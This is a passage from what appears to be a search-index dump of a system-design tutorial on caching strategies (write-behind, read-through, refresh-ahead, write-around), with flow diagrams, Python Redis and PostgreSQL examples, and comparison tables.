\u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 1. Write(key, value)\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Cache    \u2502  \u2190 Write to cache (fast response)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 2. Return immediately to app\n       \u2502\n       \u2514\u2500 3. Asynchronously write to DB later\n          (batched or delayed)\n          \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Database   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nRead Request:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Application \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 1. Read(key)\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Cache    \u2502  \u2190 Always returns data (may not be in DB yet)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre></p> <p>Python Implementation: <pre><code>import threading\nimport time\nfrom queue import Queue\n\nclass WriteBehind:\n    def __init__(self):\n        self.cache = redis.Redis(host='localhost', port=6379, decode_responses=True)\n        self.db = psycopg2.connect(\"dbname=mydb user=postgres\")\n        self.write_queue = Queue()\n\n        # Background thread for async DB writes\n        self.writer_thread = threading.Thread(target=self._background_writer, daemon=True)\n        self.writer_thread.start()\n\n    def _background_writer(self):\n        \"\"\"Background thread that writes to DB asynchronously\"\"\"\n        while True:\n            # Batch writes every 5 seconds or when queue has 100 items\n            time.sleep(5)\n\n            writes = []\n            while not self.write_queue.empty() and len(writes) &lt; 100:\n                writes.append(self.write_queue.get())\n\n            if writes:\n                # Batch write to database\n                cursor = self.db.cursor()\n                for user_id, name in writes:\n                    cursor.execute(\n                        \"INSERT INTO users (id, name) VALUES (%s, %s) \"\n                        \"ON CONFLICT (id) DO UPDATE SET name = %s\",\n                        (user_id, name, name)\n                    )\n                self.db.commit()\n                print(f\"Batch wrote {len(writes)} records to database\")\n\n    def get_user(self, user_id):\n        \"\"\"Read from cache\"\"\"\n        cache_key = f\"user:{user_id}\"\n        cached_value = self.cache.get(cache_key)\n\n        if cached_value:\n            print(f\"CACHE HIT for user {user_id}\")\n            return cached_value\n\n        # Fallback to DB if not in cache\n        print(f\"CACHE MISS for user {user_id}\")\n        cursor = self.db.cursor()\n        cursor.execute(\"SELECT name FROM users WHERE id = %s\", (user_id,))\n        result = cursor.fetchone()\n\n        if result:\n            return result[0]\n        return None\n\n    def update_user(self, user_id, new_name):\n        \"\"\"Write-Behind: Update cache immediately, DB later\"\"\"\n        cache_key = f\"user:{user_id}\"\n\n        # 1. Write to cache immediately (fast!)\n        self.cache.set(cache_key, new_name)\n\n        # 2. Queue DB write for later (async)\n        self.write_queue.put((user_id, new_name))\n\n        print(f\"Updated user {user_id} in cache (DB write queued)\")\n        # Return immediately without waiting for DB write!\n\n# Usage\nwrite_behind = WriteBehind()\nwrite_behind.update_user(1, \"John\")  # Returns immediately\nprint(write_behind.get_user(1))  # CACHE HIT - instant\ntime.sleep(6)  # Wait for background writer\n# Check DB - data should be there now\n</code></pre></p> <p>Advantages: - \u2705 Extremely fast writes (cache-only latency) - \u2705 Reduced database load (batched writes) - \u2705 Better performance for write-heavy workloads - \u2705 Can consolidate multiple writes (write coalescing)</p> <p>Disadvantages: - \u274c Risk of data loss if cache fails before DB write - \u274c Complex implementation (background writers, queues) - \u274c Eventual consistency (DB lags behind cache) - \u274c Difficult to debug (async writes)</p> <p>When to Use: - Write-heavy applications (logging, analytics, gaming leaderboards) - When write latency is critical - Systems that can tolerate some data loss - High-throughput data ingestion</p> <p>Critical Considerations:</p> <ol> <li>Data Loss Risk</li> <li>Cache can fail before DB write completes</li> <li>Use persistence (Redis AOF/RDB) to minimize loss</li> <li> <p>Not suitable for financial transactions or critical data</p> </li> <li> <p>Write Coalescing</p> </li> <li>Multiple writes to same key can be collapsed into one DB write</li> <li>Dramatically reduces database load</li> </ol> <pre><code>def background_writer_with_coalescing(self):\n    \"\"\"Batch writer that coalesces duplicate writes\"\"\"\n    while True:\n        time.sleep(5)\n\n        # Use dict to coalesce - last write wins\n        writes_dict = {}\n\n        while not self.write_queue.empty():\n            user_id, name = self.write_queue.get()\n            writes_dict[user_id] = name  # Overwrites previous value\n\n        if writes_dict:\n            cursor = self.db.cursor()\n\n            # Batch insert/update\n            for user_id, name in writes_dict.items():\n                cursor.execute(\n                    \"INSERT INTO users (id, name) VALUES (%s, %s) \"\n                    \"ON CONFLICT (id) DO UPDATE SET name = %s\",\n                    (user_id, name, name)\n                )\n\n            self.db.commit()\n            print(f\"Batch wrote {len(writes_dict)} records (coalesced from queue)\")\n</code></pre> <p>Real-World Example: Gaming Leaderboard</p> <pre><code>import time\nimport threading\nfrom queue import Queue\nfrom typing import List, Tuple\nimport json\n\nclass LeaderboardCache:\n    \"\"\"Write-Behind for high-frequency score updates in gaming\"\"\"\n\n    def __init__(self):\n        self.cache = redis.Redis(host='localhost', port=6379, decode_responses=True)\n        self.db = psycopg2.connect(\"dbname=gaming user=postgres\")\n        self.write_queue = Queue()\n        self.running = True\n\n        # Start background writer\n        self.writer_thread = threading.Thread(\n            target=self._batch_writer,\n            daemon=True\n        )\n        self.writer_thread.start()\n\n    def update_score(self, player_id: int, score: int, game_id: str):\n        \"\"\"Update player score - Write-Behind for ultra-fast response\"\"\"\n        leaderboard_key = f\"leaderboard:{game_id}\"\n        player_key = f\"player:{player_id}:score\"\n\n        # 1. Update cache immediately (FAST!)\n        # Use Redis sorted set for automatic ranking\n        self.cache.zadd(leaderboard_key, {player_id: score})\n        self.cache.set(player_key, score)\n\n        # 2. Queue for async DB write\n        self.write_queue.put(('score_update', player_id, score, game_id))\n\n        print(f\"\u26a1 Player {player_id} score updated to {score} (instant response)\")\n        # Returns immediately - player sees instant feedback!\n\n    def record_game_event(self, player_id: int, event_type: str, data: dict):\n        \"\"\"Record game events - high volume, write-behind\"\"\"\n        event_key = f\"events:{player_id}:latest\"\n\n        # Cache latest event for quick access\n        self.cache.setex(event_key, 300, json.dumps(data))\n\n        # Queue for DB persistence\n        self.write_queue.put(('event', player_id, event_type, json.dumps(data)))\n\n    def get_leaderboard(self, game_id: str, top_n: int = 10) -&gt; List[Tuple[int, int]]:\n        \"\"\"Get top players - always from cache (real-time)\"\"\"\n        leaderboard_key = f\"leaderboard:{game_id}\"\n\n        # Get top N players with scores (descending order)\n        top_players = self.cache.zrevrange(\n            leaderboard_key,\n            0,\n            top_n - 1,\n            withscores=True\n        )\n\n        leaderboard = [(int(player_id), int(score)) for player_id, score in top_players]\n\n        print(f\"\u2713 Leaderboard for {game_id}: {len(leaderboard)} players\")\n        return leaderboard\n\n    def get_player_rank(self, player_id: int, game_id: str) -&gt; Tuple[int, int]:\n        \"\"\"Get player's rank and score - instant from cache\"\"\"\n        leaderboard_key = f\"leaderboard:{game_id}\"\n\n        # Get rank (0-based, so add 1)\n        rank = self.cache.zrevrank(leaderboard_key, player_id)\n        score = self.cache.zscore(leaderboard_key, player_id)\n\n        if rank is not None and score is not None:\n            return (rank + 1, int(score))\n\n        return (None, None)\n\n    def _batch_writer(self):\n        \"\"\"Background thread - writes to DB in batches every 10 seconds\"\"\"\n        while self.running:\n            time.sleep(10)  # Batch every 10 seconds\n\n            # Collect writes with coalescing\n            score_updates = {}  # player_id -&gt; (score, game_id)\n            events = []\n\n            batch_size = 0\n            while not self.write_queue.empty() and batch_size &lt; 1000:\n                item = self.write_queue.get()\n\n                if item[0] == 'score_update':\n                    _, player_id, score, game_id = item\n                    # Coalesce: keep only latest score per player\n                    score_updates[player_id] = (score, game_id)\n\n                elif item[0] == 'event':\n                    _, player_id, event_type, data = item\n                    events.append((player_id, event_type, data))\n\n                batch_size += 1\n\n            if score_updates or events:\n                try:\n                    cursor = self.db.cursor()\n\n                    # Batch update scores\n                    if score_updates:\n                        for player_id, (score, game_id) in score_updates.items():\n                            cursor.execute(\"\"\"\n                                INSERT INTO player_scores (player_id, game_id, score, updated_at)\n                                VALUES (%s, %s, %s, NOW())\n                                ON CONFLICT (player_id, game_id)\n                                DO UPDATE SET score = %s, updated_at = NOW()\n                            \"\"\", (player_id, game_id, score, score))\n\n                    # Batch insert events\n                    if events:\n                        for player_id, event_type, data in events:\n                            cursor.execute(\"\"\"\n                                INSERT INTO game_events (player_id, event_type, data, created_at)\n                                VALUES (%s, %s, %s, NOW())\n                            \"\"\", (player_id, event_type, data))\n\n                    self.db.commit()\n\n                    print(f\"\ud83d\udcbe Batch wrote to DB: {len(score_updates)} scores, {len(events)} events\")\n\n                except Exception as e:\n                    self.db.rollback()\n                    print(f\"\u274c Batch write failed: {e}\")\n                    # Could re-queue failed writes or log to error queue\n\n# Usage Example\nleaderboard = LeaderboardCache()\n\n# High-frequency score updates (1000s per second)\nfor i in range(1000):\n    player_id = i % 100  # 100 players\n    score = 1000 + i\n    leaderboard.update_score(player_id, score, \"fortnite_match_123\")\n    # Each update returns in &lt; 1ms!\n\n# Real-time leaderboard access\ntop_10 = leaderboard.get_leaderboard(\"fortnite_match_123\", top_n=10)\nfor rank, (player_id, score) in enumerate(top_10, 1):\n    print(f\"Rank {rank}: Player {player_id} - {score} points\")\n\n# Check player rank instantly\nrank, score = leaderboard.get_player_rank(42, \"fortnite_match_123\")\nprint(f\"Player 42: Rank #{rank}, Score: {score}\")\n\n# Wait for background writer\ntime.sleep(11)\nprint(\"Scores now persisted to database!\")\n</code></pre> <p>Performance Benefits:</p> <pre><code>Without Write-Behind:\n- Score update latency: 10-20ms (DB write)\n- Max updates/second: ~50-100 per DB connection\n- Database CPU: 80-100% under load\n\nWith Write-Behind:\n- Score update latency: &lt;1ms (cache only)\n- Max updates/second: 10,000+ (cache limited)\n- Database CPU: 10-20% (batched writes)\n- Write coalescing: 1000 cache writes \u2192 100 DB writes (10x reduction)\n</code></pre> <p>Data Loss Mitigation:</p> <pre><code>class LeaderboardWithPersistence:\n    \"\"\"Write-Behind with Redis persistence for safety\"\"\"\n\n    def __init__(self):\n        # Configure Redis with AOF (Append-Only File) persistence\n        self.cache = redis.Redis(\n            host='localhost',\n            port=6379,\n            decode_responses=True\n        )\n\n        # Enable AOF persistence via redis.conf:\n        # appendonly yes\n        # appendfsync everysec  # Flush to disk every second\n\n        # Maximum data loss: 1-2 seconds of writes (vs minutes without persistence)\n</code></pre> <p>When NOT to Use Write-Behind: - \u274c Financial transactions (require immediate persistence) - \u274c Critical user data (passwords, personal info) - \u274c Inventory management (risk of overselling) - \u274c Regulatory compliance data (must be immediately persisted)</p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#4-read-through-cache","title":"4. Read-Through Cache","text":"<p>Description: </p> <p>Read-Through is a caching pattern where the cache itself is responsible for loading data from the database on cache misses, making the database completely transparent to the application. The application only ever talks to the cache, never directly to the database.</p> <p>Key Concept: The cache acts as an intelligent proxy that abstracts away the database layer. When data isn't in cache, the cache automatically retrieves it from the database, stores it, and returns it to the application - all without application involvement.</p> <p>How the pattern works conceptually: - On reads: Application \u2192 Cache \u2192 (if miss) Cache internally queries Database \u2192 Cache stores data \u2192 Cache returns to application - The application is database-agnostic - it only knows about the cache interface - The cache has built-in data loading logic - knows how to fetch from database on misses - Similar to Cache-Aside but with inverted responsibility: cache manages DB interaction, not application</p> <p>Implementation approaches: - Cache framework/library: Tools like Spring Cache, Guava Cache provide read-through support - Custom cache layer: Build a service that wraps both cache and database - Cache proxy pattern: Cache implements same interface as data layer</p> <p>Difference from Cache-Aside: - Cache-Aside: Application checks cache \u2192 if miss, app reads DB \u2192 app writes to cache - Read-Through: Application reads from cache \u2192 cache handles everything (transparent to app)</p> <p>Advantages: Cleaner application code (no cache management logic), centralized caching behavior, easier to change cache strategy without touching application code.</p> <p>Limitation: Requires cache system or framework that supports automatic data loading, or custom implementation of the proxy pattern. Not all caching systems provide this out-of-the-box.</p> <p>Flow Diagram: <pre><code>Read Request:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Application \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 1. Read(key) - only talks to cache\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Cache    \u2502  \u2190 Smart cache\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n       \u251c\u2500 2a. CACHE HIT? \u2192 Return value\n       \u2502\n       \u2514\u2500 2b. CACHE MISS?\n           \u2502 Cache automatically loads from DB\n           \u2193\n       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n       \u2502  Database   \u2502\n       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n              \u2502\n              \u2514\u2500 3. Cache populates itself\n                 4. Cache returns value to app\n\nApplication doesn't know about DB!\n</code></pre></p> <p>Python Implementation (with Proxy Pattern): <pre><code>class ReadThroughCache:\n    def __init__(self):\n        self.cache = redis.Redis(host='localhost', port=6379, decode_responses=True)\n        self.db = psycopg2.connect(\"dbname=mydb user=postgres\")\n\n    def get(self, key):\n        \"\"\"Read-Through: Cache handles DB loading automatically\"\"\"\n        # 1. Check cache\n        cached_value = self.cache.get(key)\n\n        if cached_value:\n            print(f\"CACHE HIT for {key}\")\n            return cached_value\n\n        # 2. Cache miss - load from DB (cache does this, not app)\n        print(f\"CACHE MISS for {key} - loading from DB\")\n        value = self._load_from_db(key)\n\n        if value:\n            # 3. Populate cache\n            self.cache.setex(key, 3600, value)\n            return value\n\n        return None\n\n    def _load_from_db(self, key):\n        \"\"\"Internal method - cache loads from DB\"\"\"\n        # Parse key (e.g., \"user:1\" -&gt; table=user, id=1)\n        parts = key.split(\":\")\n        if parts[0] == \"user\":\n            user_id = int(parts[1])\n            cursor = self.db.cursor()\n            cursor.execute(\"SELECT name FROM users WHERE id = %s\", (user_id,))\n            result = cursor.fetchone()\n            return result[0] if result else None\n        return None\n\n# Usage - Application only interacts with cache\ncache = ReadThroughCache()\nprint(cache.get(\"user:1\"))  # Cache loads from DB automatically\nprint(cache.get(\"user:1\"))  # Cache hit\n</code></pre></p> <p>Advantages: - \u2705 Application code simplified (only talks to cache) - \u2705 Automatic cache population - \u2705 Cache misses are transparent to application - \u2705 Centralized caching logic</p> <p>Disadvantages: - \u274c Requires cache library/framework support - \u274c Cold start penalty still exists - \u274c Less flexible than cache-aside</p> <p>When to Use: - When using caching frameworks (Spring Cache, etc.) - Want to abstract database from application - Microservices with data access layer</p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#5-refresh-ahead-cache","title":"5. Refresh-Ahead Cache","text":"<p>Description: </p> <p>Refresh-Ahead is an advanced, proactive caching pattern where the cache automatically refreshes data in the background before it expires, ensuring frequently accessed data is always fresh and never requires a cache miss. This is the opposite of lazy loading.</p> <p>Key Concept: Instead of waiting for data to expire and serving a cache miss, the cache predicts which data will be needed soon (based on access patterns or TTL thresholds) and refreshes it in advance. This creates a \"perpetually warm\" cache for hot data.</p> <p>How the pattern works conceptually: - Cache tracks TTL (Time-To-Live) and access frequency for each entry - When TTL falls below a threshold (e.g., 50% remaining) AND data is frequently accessed: trigger background refresh - Background process asynchronously fetches fresh data from database and updates cache - User requests always hit cache with fresh data - no waiting for DB queries</p> <p>Refresh strategies: 1. TTL-based: Refresh when TTL &lt; threshold (e.g., less than 30 minutes remaining on 1-hour TTL) 2. Access-based: Refresh only if data accessed recently (prevents wasting refreshes on stale data) 3. Predictive: Use machine learning to predict which data will be accessed soon 4. Periodic: Refresh hot data at fixed intervals (every 10 minutes for homepage data)</p> <p>Smart refresh logic: <pre><code>if (data_accessed_recently AND ttl_remaining &lt; threshold):\n    return cached_data  # Fast response to user\n    trigger_async_refresh()  # Update cache in background\n</code></pre></p> <p>Benefits over Cache-Aside/Read-Through: - No cache miss penalty for popular data - always served from cache - Predictable latency - no occasional slow requests due to cache misses - Reduced database load during traffic spikes (cache is pre-warmed)</p> <p>Drawbacks: - Wasted refreshes: May refresh data that won't be accessed again - Implementation complexity: Needs access tracking, TTL monitoring, background workers - Requires good access pattern prediction: Works best when you can identify \"hot\" data</p> <p>Perfect for: E-commerce homepages, trending content, game leaderboards, stock prices, sports scores - any scenario where specific data is accessed very frequently and staleness is unacceptable.</p> <p>Flow Diagram: <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Application \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 Read(key)\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Cache    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 Check TTL\n       \u2502\n       \u251c\u2500 If TTL &gt; 50% remaining \u2192 Return value\n       \u2502\n       \u2514\u2500 If TTL &lt; 50% remaining \u2192 \n          1. Return cached value (fast)\n          2. Trigger async refresh from DB\n          \u2193\n       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n       \u2502  Database   \u2502  \u2190 Refresh happens in background\n       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre></p> <p>Python Implementation: <pre><code>import time\nimport threading\n\nclass RefreshAhead:\n    def __init__(self):\n        self.cache = redis.Redis(host='localhost', port=6379, decode_responses=True)\n        self.db = psycopg2.connect(\"dbname=mydb user=postgres\")\n        self.ttl = 3600  # 1 hour\n        self.refresh_threshold = 0.5  # Refresh when 50% of TTL remains\n\n    def get_user(self, user_id):\n        \"\"\"Refresh-Ahead Read\"\"\"\n        cache_key = f\"user:{user_id}\"\n\n        # Get value and TTL\n        cached_value = self.cache.get(cache_key)\n\n        if cached_value:\n            # Check remaining TTL\n            ttl_remaining = self.cache.ttl(cache_key)\n\n            if ttl_remaining &lt; self.ttl * self.refresh_threshold:\n                # TTL below threshold - trigger async refresh\n                print(f\"CACHE HIT for user {user_id} - triggering refresh\")\n                threading.Thread(target=self._refresh_cache, args=(cache_key, user_id)).start()\n            else:\n                print(f\"CACHE HIT for user {user_id}\")\n\n            return cached_value\n\n        # Cache miss - load and cache\n        print(f\"CACHE MISS for user {user_id}\")\n        return self._load_and_cache(user_id)\n\n    def _refresh_cache(self, cache_key, user_id):\n        \"\"\"Background refresh\"\"\"\n        print(f\"Refreshing cache for user {user_id}\")\n        cursor = self.db.cursor()\n        cursor.execute(\"SELECT name FROM users WHERE id = %s\", (user_id,))\n        result = cursor.fetchone()\n\n        if result:\n            self.cache.setex(cache_key, self.ttl, result[0])\n\n    def _load_and_cache(self, user_id):\n        \"\"\"Load from DB and cache\"\"\"\n        cursor = self.db.cursor()\n        cursor.execute(\"SELECT name FROM users WHERE id = %s\", (user_id,))\n        result = cursor.fetchone()\n\n        if result:\n            cache_key = f\"user:{user_id}\"\n            self.cache.setex(cache_key, self.ttl, result[0])\n            return result[0]\n        return None\n\n# Usage\nrefresh_ahead = RefreshAhead()\nprint(refresh_ahead.get_user(1))  # CACHE MISS - loads from DB\ntime.sleep(1900)  # Wait ~30 minutes (&gt; 50% of 1 hour TTL)\nprint(refresh_ahead.get_user(1))  # CACHE HIT - triggers background refresh\n</code></pre></p> <p>Advantages: - \u2705 Popular data never expires (always fresh) - \u2705 No cache miss penalty for frequently accessed data - \u2705 Predictable low latency - \u2705 Reduced database load during peak times</p> <p>Disadvantages: - \u274c Complex implementation - \u274c Wasted refreshes for data that won't be accessed again - \u274c Requires prediction of popular data - \u274c Additional database load for refreshes</p> <p>When to Use: - High-traffic applications with hot data - When cache misses are unacceptable (gaming, real-time apps) - Predictable access patterns</p>"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#6-write-around-cache","title":"6. Write-Around Cache","text":"<p>Description: </p> <p>Write-Around is an optimization of the Cache-Aside pattern specifically designed to prevent cache pollution from write-heavy workloads. Write operations completely bypass the cache and go directly to the database, ensuring cache space is reserved only for data that's actually being read.</p> <p>Key Concept: Writes are excluded from caching because many write operations are for data that will rarely or never be read (logs, audit trails, bulk imports). By skipping cache on writes, you avoid wasting precious cache memory on data that doesn't benefit from caching.</p> <p>How the pattern works conceptually: - On writes: Application \u2192 Database directly (cache is never touched or is invalidated) - On reads: Application \u2192 Cache \u2192 (if miss) load from Database \u2192 store in Cache - The pattern assumes: Write-once, read-rarely (or never) access pattern - Cache is populated only by reads, ensuring only accessed data uses cache space</p> <p>Cache pollution scenario (that Write-Around solves): <pre><code>Scenario: Logging system writing 10,000 log entries per second\n\nWith Write-Through:\n- All 10,000 logs/sec written to cache (using 100MB+ cache space)\n- Only 10 logs/sec are ever read (for debugging)\n- Result: 99.9% of cache space wasted on unread data\n\nWith Write-Around:\n- 10,000 logs/sec written to DB only (cache bypassed)\n- Only the 10 logs/sec that are read get cached\n- Result: Cache space used efficiently for actually-read data\n</code></pre></p> <p>Pattern variations: 1. Write-Around with Invalidation: Write to DB, invalidate cache entry if exists 2. Write-Around Pure: Write to DB, don't touch cache at all (read will populate if needed)</p> <p>Difference from Cache-Aside: Cache-Aside may optionally cache on write; Write-Around explicitly never caches on write.</p> <p>Perfect for: - Bulk data imports: Loading millions of records (most never accessed) - Logging/Audit systems: High write volume, rare reads - Archive systems: Write-once, read-rarely patterns - ETL pipelines: Writing processed data that's queried infrequently</p> <p>Trade-off: First read after write always misses cache (cold read), which is acceptable when reads are rare or happen much later than writes.</p> <p>Flow Diagram: <pre><code>Write Request:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Application \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 1. Write(key, value)\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Database   \u2502  \u2190 Write directly to DB, skip cache\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n       \u2514\u2500 Cache is NOT updated\n          (Data will be cached on first read)\n\nRead Request:\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Application \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502 1. Read(key)\n       \u2193\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    Cache    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n       \u2502\n       \u251c\u2500 2a. CACHE HIT? \u2192 Return value\n       \u2502\n       \u2514\u2500 2b. CACHE MISS?\n           \u2502 Load from DB and cache it\n           \u2193\n       \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n       \u2502  Database   \u2502\n       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n              \u2502\n              \u2514\u2500 3. Cache the value\n                 4. Return to app\n</code></pre></p> <p>Python Implementation: <pre><code>class WriteAround:\n    def __init__(self):\n        self.cache = redis.Redis(host='localhost', port=6379, decode_responses=True)\n        self.db = psycopg2.connect(\"dbname=mydb user=postgres\")\n\n    def get_user(self, user_id):\n        \"\"\"Read with cache-aside logic\"\"\"\n        cache_key = f\"user:{user_id}\"\n\n        # 1. Try cache first\n        cached_value = self.cache.get(cache_key)\n\n        if cached_value:\n            print(f\"CACHE HIT for user {user_id}\")\n            return cached_value\n\n        # 2. Cache miss - load from database\n        print(f\"CACHE MISS for user {user_id}\")\n        cursor = self.db.cursor()\n        cursor.execute(\"SELECT name FROM users WHERE id = %s\", (user_id,))\n        result = cursor.fetchone()\n\n        if result:\n            user_name = result[0]\n\n            # 3. Cache the value for future reads\n            self.cache.setex(cache_key, 3600, user_name)\n\n            return user_name\n\n        return None\n\n    def create_user(self, user_id, name):\n        \"\"\"Write-Around: Write to DB only, bypass cache\"\"\"\n        # Write directly to database (NO cache write)\n        cursor = self.db.cursor()\n        cursor.execute(\"INSERT INTO users (id, name) VALUES (%s, %s)\", (user_id, name))\n        self.db.commit()\n\n        print(f\"Created user {user_id} in database (cache bypassed)\")\n        # Cache is NOT populated - will be cached on first read\n\n    def update_user(self, user_id, new_name):\n        \"\"\"Write-Around: Update DB and invalidate cache\"\"\"\n        cache_key = f\"user:{user_id}\"\n\n        # 1. Write to database only\n        cursor = self.db.cursor()\n        cursor.execute(\"UPDATE users SET name = %s WHERE id = %s\", (new_name, user_id))\n        self.db.commit()\n\n        # 2. Invalidate cache (if exists)\n        # Data will be cached on next read\n        self.cache.delete(cache_key)\n\n        print(f\"Updated user {user_id} in database and invalidated cache\")\n\n# Usage\nwrite_around = WriteAround()\n\n# Write - goes to DB, not cached\nwrite_around.create_user(1, \"John\")\n\n# First read - cache miss, loads from DB\nprint(write_around.get_user(1))  # CACHE MISS\n\n# Second read - cache hit\nprint(write_around.get_user(1))  # CACHE HIT\n\n# Update - writes to DB, invalidates cache\nwrite_around.update_user(1, \"Jane\")\n\n# Next read - cache miss (loads fresh data)\nprint(write_around.get_user(1))  # CACHE MISS\n</code></pre></p> <p>Comparison with Cache-Aside: <pre><code># Cache-Aside: Can optionally cache on write\ndef update_user_cache_aside(user_id, new_name):\n    db.update(user_id, new_name)\n    cache.set(f\"user:{user_id}\", new_name)  # \u2190 Cache updated\n\n# Write-Around: Never cache on write\ndef update_user_write_around(user_id, new_name):\n    db.update(user_id, new_name)\n    cache.delete(f\"user:{user_id}\")  # \u2190 Cache invalidated only\n</code></pre></p> <p>Advantages: - \u2705 Prevents cache pollution from write-heavy operations - \u2705 No wasted cache space for data that's rarely/never read - \u2705 Fast writes (only DB write, no cache overhead) - \u2705 Good for write-once-read-rarely scenarios - \u2705 Simple to implement</p> <p>Disadvantages: - \u274c First read after write always misses cache - \u274c Higher read latency immediately after writes - \u274c Not suitable for read-after-write patterns - \u274c Poor cache hit rate for recently written data</p> <p>When to Use: - Write-heavy workloads with infrequent reads   - Example: Logging, audit trails, archival data - Large data writes that won't be read immediately   - Example: Batch data imports, bulk uploads - When cache space is limited   - Avoid caching data that may never be read - Preventing cache pollution   - One-time writes, temporary data</p> <p>Real-World Use Cases:</p> <ol> <li> <p>Log Aggregation System: <pre><code>class LogStorage:\n    def write_log(self, log_id, log_data):\n        \"\"\"Logs are written but rarely read - use write-around\"\"\"\n        # Write to database (no cache)\n        self.db.insert_log(log_id, log_data)\n        # Don't cache - logs are rarely queried\n\n    def read_log(self, log_id):\n        \"\"\"Only cache if actually read\"\"\"\n        cached = self.cache.get(f\"log:{log_id}\")\n        if cached:\n            return cached\n\n        # Load from DB and cache\n        log_data = self.db.get_log(log_id)\n        self.cache.setex(f\"log:{log_id}\", 300, log_data)\n        return log_data\n</code></pre></p> </li> <li> <p>Batch Data Import: <pre><code>class DataImporter:\n    def import_bulk_data(self, data_list):\n        \"\"\"Bulk writes bypass cache - use write-around\"\"\"\n        # Write thousands of records to DB\n        for record in data_list:\n            self.db.insert(record)\n\n        # DON'T cache - most records won't be read\n        # Only frequently accessed records will be cached on read\n</code></pre></p> </li> <li> <p>User Activity Tracking: <pre><code>class ActivityTracker:\n    def track_event(self, user_id, event_type):\n        \"\"\"Write-around: Track events without caching\"\"\"\n        # Store event in database\n        self.db.insert_event(user_id, event_type, timestamp=now())\n\n        # Don't cache individual events\n        # Analytics queries will access DB directly\n</code></pre></p> </li> </ol> <p>Write-Around vs Other Strategies:</p> Aspect Write-Around Cache-Aside Write-Through Write to Cache \u274c No Optional \u2705 Yes Write to DB \u2705 Yes \u2705 Yes \u2705 Yes Read After Write Cache miss Cache hit (if cached) Cache hit Cache Pollution Low Medium High Best For Rare reads Frequent reads Frequent reads"},{"location":"system-design/high-level/concepts/distributed-caches-and-caching-strategies/#caching-strategy-comparison","title":"Caching Strategy Comparison","text":"Strategy Read Performance Write Performance Consistency Complexity Best For Cache-Aside Good (miss penalty) Fast Eventual Low General purpose, read-heavy Write-Through Excellent Slow Strong Medium Read-heavy, need consistency Write-Behind Excellent Excellent Eventual High Write-heavy, can tolerate loss Write-Around Good (miss after write) Fast Eventual Low Write-heavy, rare reads Read-Through Good (miss penalty) N/A 